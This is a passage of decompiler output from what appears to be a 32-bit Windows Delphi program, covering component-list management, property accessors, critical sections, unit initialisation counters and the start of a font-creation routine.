_DWORD *__usercall sub_41F9F0@<eax>(_DWORD *a1@<eax>, __int16 *a2@<edx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>)
{
  int v7; // edi
  int v8; // ecx
  unsigned int v10[2]; // [esp-18h] [ebp-24h] BYREF
  int *v11; // [esp-10h] [ebp-1Ch]
  int v12; // [esp-Ch] [ebp-18h]
  int v13; // [esp-8h] [ebp-14h]
  int v14; // [esp-4h] [ebp-10h]
  char *v15; // [esp+0h] [ebp-Ch] BYREF
  int *v16; // [esp+4h] [ebp-8h] BYREF
  int v17; // [esp+8h] [ebp-4h] BYREF
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v17 = 0;
  v16 = 0;
  v15 = 0;
  v14 = a3;
  v13 = a5;
  v12 = a4;
  v11 = &savedregs;
  v10[1] = (unsigned int)&loc_41FA96;
  v10[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  sub_406234(a2, (volatile __int32 *)&v16);
  v7 = sub_404524((int)v16);
  if ( v7 >= 2 * sub_404A6C((int)a2) )
  {
    sub_41FAA4(a1, 18, v8);
    v17 = sub_404A6C((int)a2);
    sub_41DAFC(a1, (char *)&v17, 4u);
    sub_41DAFC(a1, (char *)a2, 2 * v17);
  }
  else
  {
    sub_4044EC(&v15, (const WCHAR *)a2);
    sub_41F904(a1, v15, v16);
  }
  __writefsdword(0, v10[0]);
  v11 = (int *)&loc_41FA9D;
  sub_40426C(&v15);
  return sub_40426C(&v16);
}
// 41F9F0: could not find valid save-restore pair for ebx
// 41F9F0: could not find valid save-restore pair for edi
// 41F9F0: could not find valid save-restore pair for esi
// 41FA4C: variable 'v8' is possibly undefined

//----- (0041FAA4) --------------------------------------------------------
_DWORD *__usercall sub_41FAA4@<eax>(_DWORD *a1@<eax>, char a2@<dl>, int a3@<ecx>)
{
  int v4; // [esp+0h] [ebp-4h] BYREF

  v4 = a3;
  LOBYTE(v4) = a2;
  return sub_41DAFC(a1, (char *)&v4, 1u);
}

//----- (0041FAB8) --------------------------------------------------------
_DWORD *__usercall sub_41FAB8@<eax>(int a1@<eax>, char a2@<dl>, _BYTE *a3@<ecx>)
{
  char v3; // bl
  _DWORD *v4; // edi
  char v6; // [esp-10h] [ebp-1Ch]

  if ( a2 )
    a1 = sub_403864(a1, a2, v6);
  v3 = a2;
  v4 = (_DWORD *)a1;
  *(_BYTE *)(a1 + 36) = 1;
  if ( a3 )
    sub_41FC1C(a3, (int *)a1);
  if ( v3 )
    sub_4038BC(v4);
  return v4;
}
// 41FAC2: variable 'v6' is possibly undefined
// 41FAC9: variable 'a2' is possibly undefined
// 41FAD7: variable 'a3' is possibly undefined

//----- (0041FB04) --------------------------------------------------------
_DWORD *__usercall sub_41FB04@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  _DWORD *v4; // ebx
  int v5; // eax
  int v6; // ecx
  int v7; // esi
  int v8; // eax
  _DWORD *result; // eax
  char v10; // [esp+0h] [ebp-Ch]

  v2 = sub_4038CC(a1, a2);
  v10 = v3;
  v4 = v2;
  sub_41FD04((int)v2);
  if ( v4[5] )
  {
    while ( 1 )
    {
      v7 = v4[5];
      if ( !v7 || *(int *)(v7 + 8) <= 0 )
        break;
      v5 = sub_418C80(v4[5], *(_DWORD *)(v7 + 8) - 1);
      LOBYTE(v6) = 1;
      (*(void (__fastcall **)(int, _DWORD *))(*(_DWORD *)v5 + 16))(v6, v4);
    }
    sub_40AD4C((_DWORD **)v4 + 5);
  }
  sub_41FCAC((int)v4);
  v8 = v4[1];
  if ( v8 )
    sub_41FC74(v8, v4);
  result = sub_418FF4(v4, v10 & 0xFC);
  if ( v10 > 0 )
    return (_DWORD *)sub_4038B4(v4);
  return result;
}
// 41FB0C: variable 'v3' is possibly undefined
// 41FB31: variable 'v6' is possibly undefined

//----- (0041FB7C) --------------------------------------------------------
int __usercall sub_41FB7C@<eax>(int result@<eax>)
{
  if ( (*(_BYTE *)(result + 28) & 8) == 0 )
    return sub_41FD04(result);
  return result;
}

//----- (0041FB88) --------------------------------------------------------
__int64 __usercall sub_41FB88@<edx:eax>(int a1@<eax>, _DWORD *a2@<edx>, int a3@<ecx>)
{
  __int64 result; // rax

  result = sub_41C5FC(a2, a3);
  *(_WORD *)(a1 + 24) = result;
  return result;
}

//----- (0041FB9C) --------------------------------------------------------
__int64 __usercall sub_41FB9C@<edx:eax>(int a1@<eax>, _DWORD *a2@<edx>, int a3@<ecx>)
{
  __int64 result; // rax

  result = sub_41C5FC(a2, a3);
  *(_WORD *)(a1 + 26) = result;
  return result;
}

//----- (0041FBB0) --------------------------------------------------------
_DWORD *__usercall sub_41FBB0@<eax>(int a1@<eax>, _DWORD *a2@<edx>, int a3@<ecx>)
{
  return sub_41E380(a2, *(unsigned __int16 *)(a1 + 24), a3);
}

//----- (0041FBC8) --------------------------------------------------------
int __usercall sub_41FBC8@<eax>(int a1@<eax>, int a2@<edx>)
{
  int result; // eax

  if ( !*(_DWORD *)(a1 + 16) )
    *(_DWORD *)(a1 + 16) = sub_403504(off_417624, 1);
  result = sub_418B44(*(_DWORD **)(a1 + 16), a2);
  *(_DWORD *)(a2 + 4) = a1;
  return result;
}
// 417624: using guessed type int (*off_417624[4])();

//----- (0041FBF4) --------------------------------------------------------
_DWORD *__usercall sub_41FBF4@<eax>(int a1@<eax>, int a2@<edx>)
{
  _DWORD *result; // eax

  *(_DWORD *)(a2 + 4) = 0;
  sub_418D5C(*(_DWORD **)(a1 + 16), a2);
  result = *(_DWORD **)(a1 + 16);
  if ( !result[2] )
  {
    sub_403534(result);
    result = 0;
    *(_DWORD *)(a1 + 16) = 0;
  }
  return result;
}

//----- (0041FC1C) --------------------------------------------------------
int __usercall sub_41FC1C@<eax>(_BYTE *a1@<eax>, int *a2@<edx>)
{
  int v4; // edx

  sub_403714(a2, -11);
  (*(void (__fastcall **)(_DWORD, int *, int))(*(_DWORD *)a1 + 32))(0, a2, a2[2]);
  sub_41FBC8((int)a1, (int)a2);
  sub_4200E8(a2, 1);
  if ( (a1[28] & 0x10) != 0 )
  {
    LOBYTE(v4) = 1;
    sub_420098((int)a2, v4, 1);
  }
  return (*(int (__fastcall **)(_DWORD, int *))(*(_DWORD *)a1 + 16))(0, a2);
}
// 41FC5D: variable 'v4' is possibly undefined

//----- (0041FC74) --------------------------------------------------------
_DWORD *__usercall sub_41FC74@<eax>(int a1@<eax>, _DWORD *a2@<edx>)
{
  int v4; // ecx

  (*(void (__fastcall **)(_DWORD, _DWORD *, _DWORD))(*(_DWORD *)a1 + 32))(a2[2], a2, 0);
  LOBYTE(v4) = 1;
  (*(void (__fastcall **)(int, _DWORD *))(*(_DWORD *)a1 + 16))(v4, a2);
  sub_4200E8(a2, 0);
  return sub_41FBF4(a1, (int)a2);
}
// 41FC91: variable 'v4' is possibly undefined

//----- (0041FCAC) --------------------------------------------------------
int __usercall sub_41FCAC@<eax>(int result@<eax>)
{
  int v1; // esi
  int v2; // edi

  v1 = result;
  while ( *(_DWORD *)(v1 + 16) )
  {
    v2 = sub_418CFC(*(_DWORD *)(v1 + 16));
    if ( (*(_BYTE *)(v2 + 29) & 1) != 0 || (*(_WORD *)(v1 + 28) & 0x210) == 528 )
      sub_41FC74(v1, (_DWORD *)v2);
    else
      sub_41FBF4(v1, v2);
    result = (*(int (**)(void))(*(_DWORD *)v2 - 4))();
  }
  return result;
}

//----- (0041FD04) --------------------------------------------------------
int __usercall sub_41FD04@<eax>(int result@<eax>)
{
  int v1; // ebx
  int v2; // esi
  int v3; // edi

  v1 = result;
  if ( (*(_BYTE *)(result + 28) & 8) == 0 )
  {
    *(_WORD *)(result + 28) |= 8u;
    result = *(_DWORD *)(result + 16);
    if ( result )
    {
      if ( *(_DWORD *)(result + 8) - 1 >= 0 )
      {
        v2 = *(_DWORD *)(result + 8);
        v3 = 0;
        do
        {
          sub_418C80(*(_DWORD *)(v1 + 16), v3);
          result = sub_41FD04();
          ++v3;
          --v2;
        }
        while ( v2 );
      }
    }
  }
  return result;
}

//----- (0041FD40) --------------------------------------------------------
_DWORD *__usercall sub_41FD40@<eax>(int a1@<eax>, int a2@<edx>)
{
  _DWORD *result; // eax

  result = *(_DWORD **)(a1 + 20);
  if ( result )
  {
    sub_418D5C(result, a2);
    result = *(_DWORD **)(a1 + 20);
    if ( !result[2] )
    {
      sub_403534(result);
      result = 0;
      *(_DWORD *)(a1 + 20) = 0;
    }
  }
  return result;
}

//----- (0041FD64) --------------------------------------------------------
_DWORD *__usercall sub_41FD64@<eax>(int a1@<eax>, int a2@<edx>)
{
  sub_41FD40(a1, a2);
  return sub_41FD40(a2, a1);
}

//----- (0041FD80) --------------------------------------------------------
int __usercall sub_41FD80@<eax>(int a1@<eax>, int a2@<edx>, char a3@<cl>)
{
  int result; // eax
  int v6; // ebx
  int v7; // eax
  int v8; // ecx

  if ( a3 == 1 && a2 )
    sub_41FD64(a1, a2);
  result = *(_DWORD *)(a1 + 16);
  if ( result )
  {
    v6 = *(_DWORD *)(result + 8) - 1;
    while ( v6 >= 0 )
    {
      v7 = sub_418C80(*(_DWORD *)(a1 + 16), v6);
      LOBYTE(v8) = a3;
      (*(void (__fastcall **)(int, int))(*(_DWORD *)v7 + 16))(v8, a2);
      --v6;
      result = *(_DWORD *)(*(_DWORD *)(a1 + 16) + 8);
      if ( v6 >= result )
        v6 = result - 1;
    }
  }
  return result;
}
// 41FDBF: variable 'v8' is possibly undefined

//----- (0041FDDC) --------------------------------------------------------
int __usercall sub_41FDDC@<eax>(int a1@<eax>, _DWORD *a2@<edx>)
{
  int v4; // eax
  int v5; // ecx
  int v7; // [esp+Ch] [ebp-4h]

  v7 = 0;
  v4 = a2[8];
  if ( v4 )
    v7 = *(_DWORD *)(v4 + 24);
  (*(void (__fastcall **)(bool, const char *, _DWORD *(__usercall *)@<eax>(int@<eax>, _DWORD *@<edx>, int@<ecx>), int, __int64 (__usercall *)@<edx:eax>(int@<eax>, _DWORD *@<edx>, int@<ecx>), int))(*a2 + 4))(
    *(_WORD *)(a1 + 24) != (unsigned __int16)v7,
    "Left",
    sub_41FBB0,
    a1,
    sub_41FB88,
    a1);
  LOBYTE(v5) = HIWORD(v7) != *(_WORD *)(a1 + 26);
  return (*(int (__fastcall **)(int, int *, int (*)(), int, __int64 (__usercall *)@<edx:eax>(int@<eax>, _DWORD *@<edx>, int@<ecx>), int))(*a2 + 4))(
           v5,
           &dword_41FE60,
           sub_41FBBC,
           a1,
           sub_41FB9C,
           a1);
}
// 41FE3C: variable 'v5' is possibly undefined
// 41FBBC: using guessed type int sub_41FBBC();
// 41FE60: using guessed type int dword_41FE60;

//----- (0041FE64) --------------------------------------------------------
int sub_41FE64()
{
  return 0;
}

//----- (0041FE68) --------------------------------------------------------
void __stdcall sub_41FE68(int a1, int a2)
{
  ;
}

//----- (0041FE70) --------------------------------------------------------
int sub_41FE70()
{
  return 0;
}

//----- (0041FE78) --------------------------------------------------------
volatile __int32 *__usercall sub_41FE78@<eax>(int a1@<eax>, volatile __int32 *a2@<edx>)
{
  return sub_4042C0(a2, *(_DWORD *)(a1 + 8));
}

//----- (0041FE8C) --------------------------------------------------------
int __usercall sub_41FE8C@<eax>(int a1@<eax>)
{
  return *(_DWORD *)(a1 + 4);
}

//----- (0041FE94) --------------------------------------------------------
int sub_41FE94()
{
  return 0;
}

//----- (0041FE9C) --------------------------------------------------------
int __usercall sub_41FE9C@<eax>(int result@<eax>)
{
  *(_WORD *)(result + 28) |= 0x40u;
  return result;
}

//----- (0041FEA8) --------------------------------------------------------
int __usercall sub_41FEA8@<eax>(int result@<eax>)
{
  *(_WORD *)(result + 28) &= ~0x40u;
  return result;
}

//----- (0041FEB4) --------------------------------------------------------
int __usercall sub_41FEB4@<eax>(int result@<eax>)
{
  *(_WORD *)(result + 28) &= ~1u;
  return result;
}

//----- (0041FEC4) --------------------------------------------------------
_DWORD *__usercall sub_41FEC4@<eax>(int *a1@<eax>, int *a2@<edx>, int a3@<ecx>)
{
  return sub_41C2B0(a2, a1, a3);
}

//----- (0041FECC) --------------------------------------------------------
int __fastcall sub_41FECC(int a1, int a2)
{
  return (*(int (**)(void))(*(_DWORD *)a2 + 16))();
}

//----- (0041FED4) --------------------------------------------------------
char __userpurge sub_41FED4@<al>(int a1@<eax>, int a2@<edx>, _BYTE *a3@<ecx>, _BYTE *a4)
{
  int v5; // ebx
  int v6; // eax
  int v8; // [esp+0h] [ebp-18h]
  int v9; // [esp+4h] [ebp-14h]
  int v10; // [esp+8h] [ebp-10h]
  _BYTE *v11; // [esp+Ch] [ebp-Ch] BYREF
  char v12; // [esp+10h] [ebp-8h]
  _BYTE *v13; // [esp+14h] [ebp-4h]

  v13 = a3;
  v5 = a1;
  if ( a2 )
  {
    LOBYTE(a1) = sub_407ACC(v13, a4);
    if ( !(_BYTE)a1 && v5 == *(_DWORD *)(a2 + 4) )
    {
      a1 = sub_41FF6C(v5, a4);
      if ( a1 )
      {
        v11 = a4;
        v12 = 11;
        v6 = sub_409660((int)dword_41750C, 1, off_42B998[0], 0, (int)&v11);
        LOBYTE(a1) = sub_403CCC(v6, v8, v9, v10, (int)v11);
      }
    }
  }
  if ( (*(_BYTE *)(v5 + 28) & 0x10) != 0 && *(_DWORD *)(v5 + 4) )
    LOBYTE(a1) = (*(int (__fastcall **)(_BYTE *, int, _BYTE *))(**(_DWORD **)(v5 + 4) + 32))(v13, a2, a4);
  return a1;
}
// 41FF2A: variable 'v8' is possibly undefined
// 41FF2A: variable 'v9' is possibly undefined
// 41FF2A: variable 'v10' is possibly undefined
// 41750C: using guessed type int dword_41750C[4];
// 42B998: using guessed type int **off_42B998[5];

//----- (0041FF54) --------------------------------------------------------
void __usercall sub_41FF54(int a1@<eax>, int *a2@<edx>)
{
  int v2; // esi

  HIWORD(v2) = HIWORD(a1);
  LOWORD(v2) = -12;
  sub_403714(a2, v2);
}

//----- (0041FF6C) --------------------------------------------------------
int __usercall sub_41FF6C@<eax>(int a1@<eax>, _BYTE *a2@<edx>)
{
  int v3; // eax
  int v4; // ebx
  int i; // ebp
  int v6; // esi

  if ( !a2 )
    return 0;
  if ( !*(_DWORD *)(a1 + 16) )
    return 0;
  v3 = *(_DWORD *)(a1 + 16);
  if ( *(_DWORD *)(v3 + 8) - 1 < 0 )
    return 0;
  v4 = *(_DWORD *)(v3 + 8);
  for ( i = 0; ; ++i )
  {
    v6 = sub_418C80(*(_DWORD *)(a1 + 16), i);
    if ( sub_407ACC(*(_BYTE **)(v6 + 8), a2) )
      break;
    if ( !--v4 )
      return 0;
  }
  return v6;
}

//----- (0041FFBC) --------------------------------------------------------
_DWORD *__usercall sub_41FFBC@<eax>(_DWORD *a1@<eax>, int *a2@<edx>)
{
  _DWORD *result; // eax
  char v5; // zf
  int v6; // eax
  int v7; // edi
  int *v8; // [esp+0h] [ebp-14h] BYREF
  int v9; // [esp+4h] [ebp-10h]
  int v10; // [esp+8h] [ebp-Ch]
  int v11; // [esp+Ch] [ebp-8h]

  result = (_DWORD *)Delphi_CompareCall_404668(a1[2], a2);
  if ( !v5 )
  {
    if ( a2 && !(unsigned __int8)sub_407B60(a2) )
    {
      v8 = a2;
      LOBYTE(v9) = 11;
      v6 = sub_409660((int)dword_41750C, 1, off_42B950[0], 0, (int)&v8);
      sub_403CCC(v6, (int)v8, v9, v10, v11);
    }
    v7 = a1[1];
    if ( v7 )
      (*(void (__fastcall **)(_DWORD, _DWORD *, int *))(*(_DWORD *)v7 + 32))(a1[2], a1, a2);
    else
      (*(void (__fastcall **)(_DWORD, _DWORD, int *))(*a1 + 32))(a1[2], 0, a2);
    sub_4200E8(a1, 0);
    sub_420048((int)a1, (__int32)a2);
    return sub_4200E8(a1, 1);
  }
  return result;
}
// 41FFD0: variable 'v5' is possibly undefined
// 41750C: using guessed type int dword_41750C[4];
// 42B950: using guessed type int **off_42B950[3];

//----- (00420048) --------------------------------------------------------
volatile __int32 *__usercall sub_420048@<eax>(int a1@<eax>, __int32 a2@<edx>)
{
  return sub_4042C0((volatile __int32 *)(a1 + 8), a2);
}

//----- (0042005C) --------------------------------------------------------
int __usercall sub_42005C@<eax>(int a1@<eax>, int a2@<edx>)
{
  if ( !*(_DWORD *)(a1 + 16) )
    sub_418C2C(a2, off_42B9FC[0]);
  return sub_418C80(*(_DWORD *)(a1 + 16), a2);
}
// 42B9FC: using guessed type int **off_42B9FC[3];

//----- (00420088) --------------------------------------------------------
int __usercall sub_420088@<eax>(int a1@<eax>)
{
  int v1; // edx

  v1 = *(_DWORD *)(a1 + 16);
  if ( v1 )
    return *(_DWORD *)(v1 + 8);
  else
    return 0;
}

//----- (00420098) --------------------------------------------------------
int __usercall sub_420098@<eax>(int result@<eax>, int a2@<edx>, char a3@<cl>)
{
  int v4; // esi
  int v5; // ebp
  int v6; // edi
  int v7; // ecx

  v4 = result;
  if ( (_BYTE)a2 )
    *(_WORD *)(result + 28) |= 0x10u;
  else
    *(_WORD *)(result + 28) &= ~0x10u;
  if ( a3 )
  {
    result = sub_420088(result);
    if ( result - 1 >= 0 )
    {
      v5 = result;
      v6 = 0;
      do
      {
        sub_42005C(v4, v6);
        LOBYTE(v7) = 1;
        result = sub_420098(v7, a2);
        ++v6;
        --v5;
      }
      while ( v5 );
    }
  }
  return result;
}
// 4200D8: variable 'v7' is possibly undefined

//----- (004200E8) --------------------------------------------------------
_DWORD *__usercall sub_4200E8@<eax>(_DWORD *result@<eax>, char a2@<dl>)
{
  _DWORD *v3; // edi
  _DWORD *v4; // esi
  char v5[268]; // [esp+0h] [ebp-10Ch] BYREF

  v3 = result;
  v4 = (_DWORD *)result[1];
  if ( v4 )
  {
    sub_404500(v5, (char *)result[2], 255);
    result = sub_403814(v4, v5);
    if ( result )
    {
      if ( a2 )
        *result = v3;
      else
        *result = 0;
    }
  }
  return result;
}

//----- (00420130) --------------------------------------------------------
int __fastcall sub_420130(int a1, int a2)
{
  int v3; // ebx

  v3 = (*(int (**)(void))(*(_DWORD *)a2 + 56))();
  if ( (_BYTE)v3 )
    (*(void (**)(void))(*(_DWORD *)a2 + 64))();
  return v3;
}

//----- (00420158) --------------------------------------------------------
int __fastcall sub_420158(int a1, int a2)
{
  int v3; // ebx

  v3 = (*(int (**)(void))(*(_DWORD *)a2 + 56))();
  if ( (_BYTE)v3 )
    (*(void (**)(void))(*(_DWORD *)a2 + 60))();
  return v3;
}

//----- (00420180) --------------------------------------------------------
int __usercall sub_420180@<eax>(int a1@<eax>)
{
  if ( *(_DWORD *)(a1 + 32) )
    return (*(int (**)(void))(**(_DWORD **)(a1 + 32) + 28))();
  else
    return sub_403748();
}

//----- (00420198) --------------------------------------------------------
void __stdcall sub_420198(int a1)
{
  ;
}

//----- (004201A0) --------------------------------------------------------
int __stdcall sub_4201A0(int a1, _DWORD *a2, _DWORD *a3)
{
  if ( *(_DWORD *)(a1 + 32) )
    return (***(int (__stdcall ****)(_DWORD, _DWORD *, _DWORD *))(a1 + 32))(*(_DWORD *)(a1 + 32), a2, a3);
  if ( (unsigned __int8)sub_4035E8((int *)a1, a2, a3) )
    return 0;
  return -2147467262;
}

//----- (00420224) --------------------------------------------------------
_DWORD *sub_420224()
{
  int v0; // edi
  int v1; // ebx
  int v2; // esi
  _DWORD *v3; // eax
  unsigned int v5[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v6; // [esp-4h] [ebp-10h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v0 = sub_418F84(dword_42CBC8);
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_420279;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  if ( *(_DWORD *)(v0 + 8) - 1 >= 0 )
  {
    v1 = *(_DWORD *)(v0 + 8);
    v2 = 0;
    do
    {
      v3 = (_DWORD *)sub_418C80(v0, v2);
      sub_403534(v3);
      ++v2;
      --v1;
    }
    while ( v1 );
  }
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_420280;
  sub_418FE8(dword_42CBC8);
  return sub_403534((_DWORD *)dword_42CBC8);
}
// 42CBC8: using guessed type int dword_42CBC8;

//----- (00420290) --------------------------------------------------------
// attributes: thunk
void __usercall sub_420290(void *a1@<eax>)
{
  sub_4186D0(a1);
}

//----- (00420298) --------------------------------------------------------
int __usercall sub_420298@<eax>(int a1@<ebx>)
{
  _DWORD **v1; // eax
  int result; // eax
  unsigned int v3[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v3[2] = (unsigned int)&savedregs;
  v3[1] = (unsigned int)&loc_420337;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  if ( !++dword_42CBC4 )
  {
    sub_4186D0(hmod);
    sub_40AA74(dword_42CBC0, a1);
    sub_420224();
    sub_41B620(0, 0);
    sub_40AD4C((_DWORD **)&dword_42CBD4);
    v1 = (_DWORD **)sub_40656C();
    sub_40AD4C(v1 + 2);
    sub_40AD4C((_DWORD **)&dword_42CBCC);
    sub_40AD4C((_DWORD **)&dword_42CBC0);
    sub_405DDC((int)sub_420290);
    sub_40AD4C(&dword_42B4FC);
    DeleteCriticalSection_0(&stru_42CBD8);
    sub_40AD4C((_DWORD **)&dword_42CBD0);
  }
  result = 0;
  __writefsdword(0, v3[0]);
  return result;
}
// 42B4FC: using guessed type _DWORD *dword_42B4FC;
// 42CBC0: using guessed type int dword_42CBC0;
// 42CBC4: using guessed type int dword_42CBC4;
// 42CBCC: using guessed type int dword_42CBCC;
// 42CBD0: using guessed type int dword_42CBD0;
// 42CBD4: using guessed type int dword_42CBD4;

//----- (00420340) --------------------------------------------------------
void sub_420340()
{
  if ( dword_42CBC4-- == 0 )
  {
    InitializeCriticalSection_0(&stru_42CBD8);
    sub_405DD4((int)sub_420290);
    dword_42CBC0 = (int)sub_40A974(dword_4079B0, 1);
    dword_42CBCC = (int)sub_418420(dword_418234, 1);
    dword_42CBC8 = (int)sub_418E2C(dword_417688, 1);
    dword_42CBD4 = (int)sub_418E2C(dword_417688, 1);
  }
}
// 4079B0: using guessed type int dword_4079B0[10];
// 417688: using guessed type int dword_417688[3];
// 418234: using guessed type int dword_418234[3];
// 42CBC0: using guessed type int dword_42CBC0;
// 42CBC4: using guessed type int dword_42CBC4;
// 42CBC8: using guessed type int dword_42CBC8;
// 42CBCC: using guessed type int dword_42CBCC;
// 42CBD4: using guessed type int dword_42CBD4;

//----- (004203BC) --------------------------------------------------------
int sub_4203BC()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_4203F8;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  if ( !++dword_42CBF0 )
    sub_404CE4((int *)&off_42B500, (char *)dword_40105C, 2);
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 40105C: using guessed type int dword_40105C[2];
// 42B500: using guessed type int (*off_42B500)[4];
// 42CBF0: using guessed type int dword_42CBF0;

//----- (00420404) --------------------------------------------------------
void sub_420404()
{
  --dword_42CBF0;
}
// 42CBF0: using guessed type int dword_42CBF0;

//----- (00420424) --------------------------------------------------------
int sub_420424()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_420460;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  if ( !++dword_42CBF4 )
    sub_404CE4((int *)&off_42B508, (char *)dword_40105C, 2);
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 40105C: using guessed type int dword_40105C[2];
// 42B508: using guessed type int (*off_42B508)[4];
// 42CBF4: using guessed type int dword_42CBF4;

//----- (0042046C) --------------------------------------------------------
void sub_42046C()
{
  --dword_42CBF4;
}
// 42CBF4: using guessed type int dword_42CBF4;

//----- (0042047C) --------------------------------------------------------
int sub_42047C()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_4204A1;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_42CBF8;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 42CBF8: using guessed type int dword_42CBF8;

//----- (004204AC) --------------------------------------------------------
void sub_4204AC()
{
  --dword_42CBF8;
}
// 42CBF8: using guessed type int dword_42CBF8;

//----- (004204E4) --------------------------------------------------------
int sub_4204E4()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_420509;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_42CBFC;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 42CBFC: using guessed type int dword_42CBFC;

//----- (00420514) --------------------------------------------------------
void sub_420514()
{
  --dword_42CBFC;
}
// 42CBFC: using guessed type int dword_42CBFC;

//----- (00420964) --------------------------------------------------------
_DWORD *__usercall sub_420964@<eax>(int a1@<eax>, char a2@<dl>, __int16 a3@<cx>)
{
  char v3; // bl
  _DWORD *v4; // esi
  char v6; // [esp-10h] [ebp-18h]

  if ( a2 )
    a1 = sub_403864(a1, a2, v6);
  v3 = a2;
  v4 = (_DWORD *)a1;
  *(_WORD *)(a1 + 32) = a3;
  InitializeCriticalSection_0((LPCRITICAL_SECTION)(a1 + 8));
  if ( v3 )
    sub_4038BC(v4);
  return v4;
}
// 42096D: variable 'v6' is possibly undefined
// 420972: variable 'a2' is possibly undefined
// 420976: variable 'a3' is possibly undefined

//----- (004209A0) --------------------------------------------------------
void __usercall sub_4209A0(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi

  v2 = sub_4038CC(a1, a2);
  v4 = v3;
  v5 = v2;
  DeleteCriticalSection_0((LPCRITICAL_SECTION)(v2 + 2));
  if ( v4 > 0 )
    sub_4038B4(v5);
}
// 4209A7: variable 'v3' is possibly undefined

//----- (004209C4) --------------------------------------------------------
void __usercall sub_4209C4(int a1@<eax>)
{
  EnterCriticalSection_0((LPCRITICAL_SECTION)(a1 + 8));
}

//----- (004209D0) --------------------------------------------------------
void __usercall sub_4209D0(int a1@<eax>)
{
  LeaveCriticalSection_0((LPCRITICAL_SECTION)(a1 + 8));
}

//----- (00420DDC) --------------------------------------------------------
signed int __usercall sub_420DDC@<eax>(signed int result@<eax>)
{
  if ( result < 0 )
    return GetSysColor((unsigned __int8)result);
  return result;
}

//----- (00420DEC) --------------------------------------------------------
char __usercall sub_420DEC@<al>(int a1@<eax>, volatile __int32 *a2@<edx>)
{
  return sub_418910(a1, a2, &dword_42B53C, 48);
}
// 42B53C: using guessed type int dword_42B53C;

//----- (00420DFC) --------------------------------------------------------
char __usercall sub_420DFC@<al>(_BYTE *a1@<eax>, _DWORD *a2@<edx>)
{
  return sub_4188D0(a1, a2, (int)&dword_42B53C, 48);
}
// 42B53C: using guessed type int dword_42B53C;

//----- (00420FC0) --------------------------------------------------------
char __usercall sub_420FC0@<al>(int a1@<eax>, volatile __int32 *a2@<edx>)
{
  return sub_418910(a1, a2, &dword_42B6C4, 17);
}
// 42B6C4: using guessed type int dword_42B6C4;

//----- (00420FD0) --------------------------------------------------------
char __usercall sub_420FD0@<al>(_BYTE *a1@<eax>, _DWORD *a2@<edx>)
{
  return sub_4188D0(a1, a2, (int)&dword_42B6C4, 17);
}
// 42B6C4: using guessed type int dword_42B6C4;

//----- (00420FE0) --------------------------------------------------------
int __usercall sub_420FE0@<eax>(int a1@<eax>)
{
  char v2; // al
  HFONT v3; // eax
  int v4; // ebx
  unsigned int v6[2]; // [esp-18h] [ebp-68h] BYREF
  int *v7; // [esp-10h] [ebp-60h]
  unsigned int v8[2]; // [esp-Ch] [ebp-5Ch] BYREF
  int *v9; // [esp-4h] [ebp-54h]
  char *v10; // [esp+4h] [ebp-4Ch] BYREF
  char *v11; // [esp+8h] [ebp-48h] BYREF
  char *v12; // [esp+Ch] [ebp-44h] BYREF
  LOGFONTA lf; // [esp+10h] [ebp-40h] BYREF
  int v14; // [esp+4Ch] [ebp-4h]
  int savedregs; // [esp+50h] [ebp+0h] BYREF

  v10 = 0;
  v11 = 0;
  v12 = 0;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_421169;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  v14 = *(_DWORD *)(a1 + 16);
  if ( !*(_DWORD *)(v14 + 8) )
  {
    sub_4209C4(dword_42CC4C);
    v7 = &savedregs;
    v6[1] = (unsigned int)&loc_421141;
    v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v6);
    if ( !*(_DWORD *)(v14 + 8) )
    {
      lf.lfHeight = *(_DWORD *)(v14 + 20);
      memset(&lf.lfWidth, 0, 12);
      if ( (*(_BYTE *)(v14 + 25) & 1) != 0 )
        lf.lfWeight = 700;
      else
